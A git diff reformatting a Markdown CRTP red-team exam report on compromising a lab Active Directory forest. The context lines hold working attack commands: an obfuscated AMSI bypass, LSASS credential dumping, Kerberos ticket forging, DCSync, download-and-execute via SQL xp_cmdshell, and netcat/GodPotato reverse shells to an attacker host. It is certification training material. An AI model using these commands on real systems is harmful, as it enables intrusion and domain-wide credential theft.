@@ -1,17 +1,35 @@
-# Certified Red Team Professional (CRTP) Exam Report
+---
+title: "Certified Red Team Professional Exam Report"
+author: "Francesco Lonardo"
+date: "2025-03-14"
+subject: "Certified Red Team Professional (CRTP)"
+lang: "en"
+titlepage: true
+titlepage-color: "F2F3F5"
+titlepage-text-color: "000000"
+titlepage-rule-color: "000000"
+titlepage-rule-height: 2
+book: true
+classoption: oneside
+code-block-font-size: \scriptsize
+colorlinks: true
+linkcolor: orange
+urlcolor: orange
+toccolor: black
+---
 
-## Introduction
+# Introduction
 
 This report for the **Certified Red Team Professional (CRTP)** exam documents an entirely hands-on challenge designed to assess the ability to compromise a realistic Windows Active Directory environment by focusing on misconfigurations and advanced techniques, rather than trivial or "one-click" exploits. During the 24-hour exam window, I investigated multiple domains, enumerated configurations, and executed various techniques for privilege escalation and lateral movement. This document provides a detailed account of the steps, methodologies, and observations I made while compromising each target server in the lab environment.
 
-### Exam Scope
+## Exam Scope
 
 - **Targets**: The exam lab contains five target servers, each with unique roles, domains, and configurations.
 - **Entry Point VM**: A dedicated virtual machine was provided as a launch point to launch attacks within the environment, but it does not count as a target server.
 - **Goal**: Achieve OS command execution on each target server. Full administrative privileges are helpful, but not explicitly required for passing.
 - **Methodology**: Avoid destructive attacks, brute-forcing, or exploit kits that rely on patchable CVEs. Instead, leverage legitimate Windows features, AD misconfigurations, and known post-exploitation tools (appropriately documented in this report).
 
-### Exam Objective
+## Exam Objective
 
 The primary aim was to **demonstrate a practical red team engagement** approach in an Active Directory environment, specifically by:
 
@@ -24,7 +42,7 @@ By the conclusion of this report, the reader should understand both the **tactic
 
 ---
 
-## Executive Summary
+# Executive Summary
 
 This is a concise narrative of how the Active Directory environment was discovered, exploited, and ultimately fully compromised. This summary omits lower-impact details and focuses on the key steps that drove the attack forward.
 
@@ -57,17 +75,15 @@ By the end of these steps, the entire forest was under attacker control. Key tec
 
 ---
 
-## Attack Methodology
+# Attack Methodology
 
-### Domain Enumeration
-
-1) **Domain Enumeration on `tech.finance.corp`** (successful ✅)
+## **Domain Enumeration on `tech.finance.corp`** (successful)
 
 Description: Performed a comprehensive enumeration of the `tech.finance.corp` domain and its forest context, revealing a two-domain forest (`finance.corp` as root and `tech.finance.corp` as child) with a bidirectional trust. Enumerated domain users, computers, and groups, noting that the built-in `Administrator` accounts reside in both Domain Admins and Enterprise Admins groups. Discovered that `tech\sqlserversync` has replication-related ACL rights, is a SQL Administrator for `dbserver31.tech.finance.corp`, and maintains an active session on that server. `tech\techservice` also has a session running on `mgmtsrv.tech.finance.corp`. Attempted to find SMB shares and local admin access, from the perspective of the user `tech\studentuser`, but no immediate misconfigurations or accessible shares were found. Overall, these findings established the groundwork for subsequent misconfigurations abuse, lateral movement and privilege escalation steps.
 
 - 1.1) **Identify Domains, Forests, Trusts**
 
-![studvm | studentuser $>](./assets/badges/studvm-studentuser0.svg)
+![](./assets/badges/studvm-studentuser0.svg){.left}
 
 `C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat`:
 ```
@@ -154,7 +170,7 @@ WhenChanged     : 3/11/2025 8:53:24 AM
 
 - 1.2) **Identify Domain Users, Computers, Groups**
 
-![studvm | studentuser $>](./assets/badges/studvm-studentuser0.svg)
+![](./assets/badges/studvm-studentuser0.svg){.left}
 
 `whoami`:
 ```
@@ -232,7 +248,7 @@ MemberSID               : S-1-5-21-1712611810-3596029332-2671080496-500
 
 - 1.3) **Identify Domain ACLs, OUs, GPOs**
 
-![studvm | studentuser $>](./assets/badges/studvm-studentuser0.svg)
+![](./assets/badges/studvm-studentuser0.svg){.left}
 
 `Find-InterestingDomainACL -ResolveGUIDs | ?{$_.identityreferencename -match 'sqlserversync'}`:
 ```
@@ -290,7 +306,7 @@ IdentityReferenceClass  : user
 
 - 1.4) **Attempt to Discovery Domain Shares**
 
-![studvm | studentuser $>](./assets/badges/studvm-studentuser0.svg)
+![](./assets/badges/studvm-studentuser0.svg){.left}
 
 `Import-Module C:\AD\Tools\PowerHuntShares.psm1`
 
@@ -319,7 +335,7 @@ IdentityReferenceClass  : user
 
 - 1.5) **Identify Local Admin Access**
 
-![studvm | studentuser $>](./assets/badges/studvm-studentuser0.svg)
+![](./assets/badges/studvm-studentuser0.svg){.left}
 
 `Import-Module C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1`
 
@@ -330,7 +346,7 @@ IdentityReferenceClass  : user
 
 - 1.6) **Identify Domain Active Sessions**
 
-![studvm | studentuser $>](./assets/badges/studvm-studentuser0.svg)
+![](./assets/badges/studvm-studentuser0.svg){.left}
 
 `Import-Module C:\AD\Tools\Invoke-SessionHunter.ps1`
 
@@ -352,7 +368,7 @@ mgmtsrv🖥️    TECH\techservice👤    False
 
 Description: Discovered a misconfigured Windows service (`vds`) that was running as `LocalSystem` and allowed modifications to its binary path. By leveraging `PowerUp`, the service's path was temporarily replaced with a command to add `tech\studentuser` to the local Administrators group. This successfully elevated the user's privileges on `studvm.tech.finance.corp`.
 
-![studvm | studentuser $>](./assets/badges/studvm-studentuser0.svg)
+![](./assets/badges/studvm-studentuser0.svg){.left}
 
 `C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat`:
 ```
@@ -404,7 +420,7 @@ ServiceAbused Command
 vds           net localgroup Administrators tech\studentuser /add⏫
 ```
 
-![studvm | studentuser $>](./assets/badges/studvm-studentuser1.svg)
+![](./assets/badges/studvm-studentuser1.svg){.left}
 
 `whoami /groups`:
 ```
@@ -432,7 +448,7 @@ BUILTIN\Administrators👥                   Alias            S-1-5-32-544 Manda
 
 Description: Enumerated service accounts with Service Principal Names (SPNs) and performed a Kerberoasting attack on `tech\sqlserversync` in an attempt to gain the service account password and pivot onto `dbserver31.tech.finance.corp`. Although the Kerberos TGS was successfully extracted, the password could not be cracked with multiple wordlists, implying a strong password policy.
 
-![studvm | studentuser $>](./assets/badges/studvm-studentuser0.svg)
+![](./assets/badges/studvm-studentuser0.svg){.left}
 
 `C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat`:
 ```
@@ -504,7 +520,7 @@ $z="t";$y="s";$x="a";$w="o";$v="r";$u="e";$t="b";$s="r";$r="e";$q="k";$Pwn="$q$r
 [*] Roasted hashes written to : C:\AD\Tools\krb5tgs_hashes.txt📌
 ```
 
-![studvm | studentuser $>](./assets/badges/studvm-studentuser0.svg)
+![](./assets/badges/studvm-studentuser0.svg){.left}
 
 `type C:\AD\Tools\krb5tgs_hashes.txt`:
 ```
@@ -513,7 +529,7 @@ $krb5tgs$23$*sqlserversync$tech.finance.corp$MSSQLSvc/dbserver31.tech.finance.co
 [SNIP]
 ```
 
-![kali | attacker $>](./assets/badges/kali-attacker0.svg)
+![](./assets/badges/kali-attacker0.svg){.left}
 
 `john --format=krb5tgs --wordlist=./10k-worst-pass.txt ./krb5tgs_hashes.txt`:
 ```
@@ -546,7 +562,7 @@ Description: Performed Active Directory enumeration to identify users or machine
 
 - 4.1) **Attempt to Find a Delegator User where Constrained Delegation is Enabled**
 
-![studvm | studentuser $>](./assets/badges/studvm-studentuser0.svg)
+![](./assets/badges/studvm-studentuser0.svg){.left}
 
 `C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat`:
 ```
@@ -562,7 +578,7 @@ Description: Performed Active Directory enumeration to identify users or machine
 
 - 4.2) **Identify a Delegator Server where Constrained Delegation is Enabled**
 
-![studvm | studentuser $>](./assets/badges/studvm-studentuser0.svg)
+![](./assets/badges/studvm-studentuser0.svg){.left}
 
 `C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat`:
 ```
@@ -616,7 +632,7 @@ dnshostname                   : studvm.tech.finance.corp
 
 - 4.3) **Extract the Delegator Server AES Kerberos Key**
 
-![studvm | studentuser $>](./assets/badges/studvm-studentuser1.svg)
+![](./assets/badges/studvm-studentuser1.svg){.left}
 
 `C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "sekurlsa::evasive-keys" "exit"`:
 ```
@@ -646,7 +662,7 @@ SID               : S-1-5-18
 
 - 4.4) **Forge an S4U TGS using the Delegator Server AES Kerberos Key for the CIFS Service Delegation and Leverage it to Request and Obtain a TGS for the HTTP Service**
 
-![studvm | studentuser $>](./assets/badges/studvm-studentuser1.svg)
+![](./assets/badges/studvm-studentuser1.svg){.left}
 
 `C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args s4u /user:studvm$ /aes256:7f2a3239887475600fcc8595732fa9fd9756a3042254baba6c7600560a1c5eb6 /impersonateuser:Administrator /msdsspn:CIFS/mgmtsrv.tech.finance.corp /altservice:http /ptt`:
 ```
@@ -714,7 +730,7 @@ C:\Users\Administrator.TECH>
 ```
 🚀
 
-![mgmtsrv | administrator #>](./assets/badges/mgmtsrv-administrator1.svg)
+![](./assets/badges/mgmtsrv-administrator1.svg){.left}
 
 `set username`:
 ```
@@ -735,7 +751,7 @@ COMPUTERNAME=MGMTSRV🖥️
 
 Description: Executed PowerShell logging and AMSI bypass techniques to evade detection while performing credential extraction. Extracted cleartext credentials and Kerberos keys of `tech\techservice` and `tech\MGMTSRV$` from LSASS memory on `mgmtsrv.tech.finance.corp`. These credentials will be leveraged for lateral movement and further privilege escalation within the domain.
 
-![mgmtsrv | administrator #>](./assets/badges/mgmtsrv-administrator1.svg)
+![](./assets/badges/mgmtsrv-administrator1.svg){.left}
 
 - 5.1) **Bypassing PowerShell Logging and AMSI for Evasion**
 
@@ -756,7 +772,7 @@ S`eT-It`em ( 'V'+'aR' + 'IA' + (("{1}{0}"-f'1','blE:')+'q2') + ('uZ'+'x') ) ( [T
 
 - 5.2) **Extract Credentials of `tech\techservice` and `tech\MGMTSRV$` from LSASS Memory on `mgmtsrv.tech.finance.corp`**
 
-![mgmtsrv | administrator #>](./assets/badges/mgmtsrv-administrator1.svg)
+![](./assets/badges/mgmtsrv-administrator1.svg){.left}
 
 `iwr http://172.16.100.1/Loader.exe -OutFile C:\Users\Public\Loader.exe`
 
@@ -840,7 +856,7 @@ SID               : S-1-5-18
 
 Description: Leveraged the RC4 Kerberos key extracted from `mgmtsrv.tech.finance.corp` to forge a Silver Ticket for the `http/mgmtsrv.tech.finance.corp` service. The ticket was generated using `Rubeus` and injected into the current session, granting administrator-level access to `mgmtsrv.tech.finance.corp` without requiring authentication from the Domain Controller. This technique enables persistence and stealthy access to the target machine, bypassing standard Kerberos authentication mechanisms.
 
-![studvm | studentuser $>](./assets/badges/studvm-studentuser0.svg)
+![](./assets/badges/studvm-studentuser1.svg){.left}
 
 `C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:http/mgmtsrv.tech.finance.corp /rc4:207218a0920d00bbbd4daa22f6e767d3 /sid:S-1-5-21-1325336202-3661212667-302732393 /ldap /user:administrator /domain:tech.finance.corp /ptt`:
 ```
@@ -915,7 +931,7 @@ C:\Users\Administrator.TECH>
 
 Description: Used the AES-256 Kerberos Key of `tech\techservice`, extracted in a previous step, to request a TGT (Ticket Granting Ticket) without needing the user's password. This was achieved using `Rubeus` to perform an OverPass-The-Hash attack. The obtained ticket was injected into a new logon session, allowing authenticated access as `tech\techservice` and enabling lateral movement to `techsrv30.tech.finance.corp`.
 
-![studvm | studentuser $>](./assets/badges/studvm-studentuser1.svg)
+![](./assets/badges/studvm-studentuser1.svg){.left}
 
 `C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:techservice /aes256:7f6825f607e9474bcd6b9c684dc70f7c1ca977ade7bfd2ad152fd54968349deb /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt`:
 ```
@@ -960,9 +976,9 @@ Description: Used the AES-256 Kerberos Key of `tech\techservice`, extracted in a
   ASREP (key)              :  7F6825F607E9474BCD6B9C684DC70F7C1CA977ADE7BFD2AD152FD54968349DEB
 ```
 
-![Spawned `cmd` process](./assets/badges/spawned_cmd.svg)
+![](./assets/badges/spawned_cmd.svg){.left}
 
-![studvm | studentuser $>](./assets/badges/studvm-studentuser1.svg)
+![](./assets/badges/studvm-studentuser1.svg){.left}
 
 `klist`:
 ```
@@ -991,7 +1007,7 @@ C:\Users\techservice>
 ```
 🚀
 
-![techsrv30 | techservice #>](./assets/badges/techsrv30-techservice1.svg)
+![](./assets/badges/techsrv30-techservice1.svg){.left}
 
 `set username`:
 ```
@@ -1014,7 +1030,7 @@ Description: Executed PowerShell logging and AMSI bypass techniques to evade det
 
 - 8.1) **Bypassing PowerShell Logging and AMSI for Evasion**
 
-![techsrv30 | techservice #>](./assets/badges/techsrv30-techservice1.svg)
+![](./assets/badges/techsrv30-techservice1.svg){.left}
 
 `powershell`
 
@@ -1033,7 +1049,7 @@ S`eT-It`em ( 'V'+'aR' + 'IA' + (("{1}{0}"-f'1','blE:')+'q2') + ('uZ'+'x') ) ( [T
 
 - 8.2) **Extract Credentials of `tech\databaseagent` and `tech\TECHSRV30$` from LSASS Memory on `techsrv30.tech.finance.corp`**
 
-![techsrv30 | techservice #>](./assets/badges/techsrv30-techservice1.svg)
+![](./assets/badges/techsrv30-techservice1.svg){.left}
 
 `iwr http://172.16.100.1/Loader.exe -OutFile C:\Users\Public\Loader.exe`
 
@@ -1104,7 +1120,7 @@ SID               : S-1-5-18
 
 Description: Used the cleartext credential of `tech\databaseagent`, extracted in a previous step, to initiate a net-only authentication session with `RunAs`. This allowed running commands as `tech\databaseagent` while maintaining the original user's context in the local environment. Privilege enumeration revealed that `SeDebugPrivilege` and `SeImpersonatePrivilege` were enabled, which could be leveraged for potential privilege escalation and further lateral movement within the domain.
 
-![studvm | studentuser $>](./assets/badges/studvm-studentuser1.svg)
+![](./assets/badges/studvm-studentuser1.svg){.left}
 
 `runas /user:tech\databaseagent /netonly "powershell -Command \"Start-Process cmd -Verb RunAs\""`:
 ```
@@ -1112,9 +1128,9 @@ Enter the password for tech\databaseagent:📌
 Attempting to start powershell -Command "Start-Process cmd -Verb RunAs" as user "tech\databaseagent" ...
 ```
 
-![Spawned `cmd` process](./assets/badges/spawned_cmd.svg)
+![](./assets/badges/spawned_cmd.svg){.left}
 
-![studvm | studentuser $>](./assets/badges/studvm-studentuser0.svg)
+![](./assets/badges/studvm-studentuser0.svg){.left}
 
 `whoami`:
 ```
@@ -1164,7 +1180,7 @@ Description: Exploited a `sysadmin`-level SQL Server instance on `dbserver31.tec
 
 - 10.1) **Identify a Target SQL Server where we have Authentication Rights**
 
-![studvm | studentuser $>](./assets/badges/studvm-studentuser0.svg)
+![](./assets/badges/studvm-studentuser0.svg){.left}
 
 `C:\AD\Tools\InviShell\RunWithPathAsAdmin.bat`:
 ```
@@ -1267,7 +1283,7 @@ Links       :
 
 - 10.4) **Obtain a Reverse Shell Executing a PowerShell Script on the Target SQL Server**
 
-![studvm | studentuser $>](./assets/badges/studvm-studentuser0.svg)
+![](./assets/badges/studvm-studentuser0.svg){.left}
 
 `C:\AD\Tools\nc64.exe -lvp 443`:
 ```
@@ -1280,7 +1296,7 @@ listening on [any] 443 ...
 
 `Get-SQLServerLinkCrawl -Instance 'dbserver31.tech.finance.corp' -Query 'exec master..xp_cmdshell ''powershell -c "iex (iwr -UseBasicParsing http://172.16.100.1/sbloggingbypass.txt);iex (iwr -UseBasicParsing http://172.16.100.1/amsibypass.txt);iex (iwr -UseBasicParsing http://172.16.100.1/Invoke-PowerShellTcpEx.ps1)"''' -QueryTarget 'dbserver31'`
 
-![studvm | studentuser $>](./assets/badges/studvm-studentuser0.svg)
+![](./assets/badges/studvm-studentuser0.svg){.left}
 
 ```
 [...]
@@ -1294,7 +1310,7 @@ PS C:\Windows\system32>
 ```
 🚀
 
-![dbserver31 | system #>](./assets/badges/dbserver31-system1.svg)
+![](./assets/badges/dbserver31-system1.svg){.left}
 
 `$env:username`:
 ```
@@ -1330,7 +1346,7 @@ SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
 
 Description: Attempted to extract credentials from `dbserver31.tech.finance.corp` using `SafetyKatz`, but the operation failed due to insufficient privileges. Since the session was not running in high integrity, access to the LSASS process was restricted. This failure highlights the necessity of obtaining elevated privileges before attempting credential extraction.
 
-![dbserver31 | system #>](./assets/badges/dbserver31-system1.svg)
+![](./assets/badges/dbserver31-system1.svg){.left}
 
 `iex (iwr -UseBasicParsing http://172.16.100.1/sbloggingbypass.txt)`
 
@@ -1361,7 +1377,7 @@ Description: Attempted to extract credentials from `dbserver31.tech.finance.corp
 
 Description: Used `GodPotato`, an exploit leveraging Named Pipe token impersonation, to escalate privileges to `SYSTEM` on `dbserver31.tech.finance.corp`. A reverse shell was established to maintain access and facilitate further post-exploitation activities.
 
-![dbserver31 | sqlserversync $>](./assets/badges/dbserver31-sqlserversync0.svg)
+![](./assets/badges/dbserver31-sqlserversync0.svg){.left}
 
 `Get-ChildItem 'HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP\v4\Full\' | Get-ItemPropertyValue -Name Version`:
 ```
@@ -1372,7 +1388,7 @@ Description: Used `GodPotato`, an exploit leveraging Named Pipe token impersonat
 
 `iwr http://172.16.100.1/nc64.exe -OutFile C:\Users\Public\nc64.exe`
 
-![studvm | studentuser $>](./assets/badges/studvm-studentuser0.svg)
+![](./assets/badges/studvm-studentuser0.svg){.left}
 
 `C:\AD\Tools\nc64.exe -lvp 1337`:
 ```
@@ -1381,11 +1397,11 @@ listening on [any] 1337 ...
 [...]
 ```
 
-![dbserver31 | sqlserversync $>](./assets/badges/dbserver31-sqlserversync0.svg)
+![](./assets/badges/dbserver31-sqlserversync0.svg){.left}
 
 `C:\Users\Public\GodPotato-NET4.exe -cmd "C:\Users\Public\nc64.exe -e C:\Windows\System32\cmd.exe 172.16.100.1 1337"`
 
-![studvm | studentuser $>](./assets/badges/studvm-studentuser0.svg)
+![](./assets/badges/studvm-studentuser0.svg){.left}
 
 ```
 [...]
@@ -1399,7 +1415,7 @@ C:\Windows\system32>
 ```
 🚀
 
-![dbserver31 | system #>](./assets/badges/dbserver31-system1.svg)
+![](./assets/badges/dbserver31-system1.svg){.left}
 
 `$env:username`:
 ```
@@ -1421,7 +1437,7 @@ Description: Executed PowerShell logging and AMSI bypass techniques to evade det
 
 - 13.1) **Bypassing PowerShell Logging and AMSI for Evasion**
 
-![dbserver31 | system #>](./assets/badges/dbserver31-system1.svg)
+![](./assets/badges/dbserver31-system1.svg){.left}
 
 `powershell`
 
@@ -1440,7 +1456,7 @@ S`eT-It`em ( 'V'+'aR' + 'IA' + (("{1}{0}"-f'1','blE:')+'q2') + ('uZ'+'x') ) ( [T
 
 - 13.2) **Extract Credentials of `tech\sqlserversync` and `tech\DBSERVER31$` from LSASS Memory on `dbserver31.tech.finance.corp`**
 
-![dbserver31 | system #>](./assets/badges/dbserver31-system1.svg)
+![](./assets/badges/dbserver31-system1.svg){.left}
 
 `C:\Users\Public\Loader.exe -path C:\Users\Public\SafetyKatz.exe -args "sekurlsa::evasive-keys" "exit"`:
 ```
@@ -1499,7 +1515,7 @@ SID               : S-1-5-18
 
 Description: An OverPass-The-Hash approach was used to impersonate `tech\sqlserversync` by requesting a TGT with the account's AES-256 Kerberos key. Since `sqlserversync` possessed domain replication privileges, we then executed a DCSync attack on `tech\administrator` and `tech\krbtgt` to extract their AES-256 Kerberos keys and NTLM hashes. The successful retrieval of these credentials enables lateral movement and privilege escalation. Notably, the `tech\krbtgt` credentials are useful for Golden Ticket attacks, while the `tech\administrator` credentials provide administrative access to the domain, facilitating further exploitation.
 
-![studvm | studentuser $>](./assets/badges/studvm-studentuser1.svg)
+![](./assets/badges/studvm-studentuser1.svg){.left}
 
 `C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:sqlserversync /aes256:9ad6e6b51e9e3c9512b3a924360f779886d7b08e6da23d01aa4f664270b7ee65 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt`:
 ```
@@ -1544,9 +1560,9 @@ Description: An OverPass-The-Hash approach was used to impersonate `tech\sqlserv
   ASREP (key)              :  9AD6E6B51E9E3C9512B3A924360F779886D7B08E6DA23D01AA4F664270B7EE65
 ```
 
-![Spawned `cmd` process](./assets/badges/spawned_cmd.svg)
+![](./assets/badges/spawned_cmd.svg){.left}
 
-![studvm | studentuser $>](./assets/badges/studvm-studentuser1.svg)
+![](./assets/badges/studvm-studentuser0.svg){.left}
 
 `klist`:
 ```
@@ -1701,7 +1717,7 @@ Supplemental Credentials:
 
 Description: Leveraged the AES-256 Kerberos key extracted for `tech\administrator` to forge a Golden Ticket for the `krbtgt/tech.finance.corp` service. The ticket was generated using `Rubeus` and injected into the current session, granting administrator-level access to the domain. This technique allows domain persistence, as the forged ticket can continue to provide access to the domain services, bypassing the standard authentication mechanism.
 
-![studvm | studentuser $>](./assets/badges/studvm-studentuser1.svg)
+![](./assets/badges/studvm-studentuser1.svg){.left}
 
 `C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:administrator /aes256:d9410bd213225049d5beb8cd5fa2eeefc856ffbaa6f35541ac91d6ba2c5ed165 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt`:
 ```
@@ -1746,9 +1762,9 @@ Description: Leveraged the AES-256 Kerberos key extracted for `tech\administrato
   ASREP (key)              :  D9410BD213225049D5BEB8CD5FA2EEEFC856FFBAA6F35541AC91D6BA2C5ED165
 ```
 
-![Spawned `cmd` process](./assets/badges/spawned_cmd.svg)
+![](./assets/badges/spawned_cmd.svg){.left}
 
-![studvm | studentuser $>](./assets/badges/studvm-studentuser1.svg)
+![](./assets/badges/studvm-studentuser0.svg){.left}
 
 `whoami /groups`:
 ```
@@ -1792,7 +1808,7 @@ C:\Users\Administrator>
 ```
 🚀
 
-![tech-dc | administrator #>](./assets/badges/techdc-administrator1.svg)
+![](./assets/badges/techdc-administrator1.svg){.left}
 
 `whoami`:
 ```
@@ -1834,7 +1850,7 @@ Mandatory Label\High Mandatory Level        Label            S-1-16-12288
 
 Description: Extracted credentials include the NTLM hashes of high-privileged accounts such as `tech\administrator` and `tech\krbtgt` from LSASS memory on `tech-dc.tech.finance.corp`. These credentials can be used for domain lateral movement, escalating privileges, and maintaining domain persistence.
 
-![tech-dc | administrator #>](./assets/badges/techdc-administrator1.svg)
+![](./assets/badges/techdc-administrator1.svg){.left}
 
 `netsh interface portproxy add v4tov4 listenport=1234 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.1`
 
@@ -1921,7 +1937,7 @@ Description: Abused the child domain `krbtgt` TGT encryption key from `tech.fina
 
 - 17.1) **Forge a Golden Ticket (with EA SID History) using the Child DC's `krbtgt` TGT Encryption Key**
 
-![studvm | studentuser $>](./assets/badges/studvm-studentuser0.svg)
+![](./assets/badges/studvm-studentuser0.svg){.left}
 
 `C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat`:
 ```
@@ -2023,7 +2039,7 @@ C:\Users\Administrator.TECH>
 ```
 🚀
 
-![finance-dc | administrator #>](./assets/badges/financedc-administrator1.svg)
+![](./assets/badges/financedc-administrator1.svg){.left}
 
 `set username`:
 ```
@@ -2044,7 +2060,7 @@ COMPUTERNAME=FINANCE-DC🖥️
 
 Description: Extracted the NTLM hashes of all the domain accounts from LSASS memory on `finance-dc.finance.corp`. These credentials can be leveraged for lateral movement and further privilege escalation within the root domain `finance.corp`.
 
-![finance-dc | administrator #>](./assets/badges/financedc-administrator1.svg)
+![](./assets/badges/financedc-administrator1.svg){.left}
 
 `netsh interface portproxy add v4tov4 listenport=1234 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.1`
 
@@ -2083,5 +2099,3 @@ NTLM : 862f4b5c687b92f464576a572b5214e6
 
 ---
 ---
-
-
